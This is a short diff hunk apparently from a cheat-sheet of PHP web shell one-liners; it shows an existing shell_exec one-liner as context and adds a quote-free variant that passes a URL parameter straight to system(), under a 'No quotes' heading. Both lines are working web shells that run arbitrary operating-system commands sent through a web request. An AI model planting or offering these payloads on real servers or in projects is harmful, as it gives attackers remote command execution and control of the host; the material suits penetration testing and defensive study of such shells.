@@ -111,6 +111,10 @@ Tighter:
 
 `<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
 
+No quotes:
+
+`<?php echo system($_GET[1]); ?>`
+
 PHP interactive shell:
 
 ```
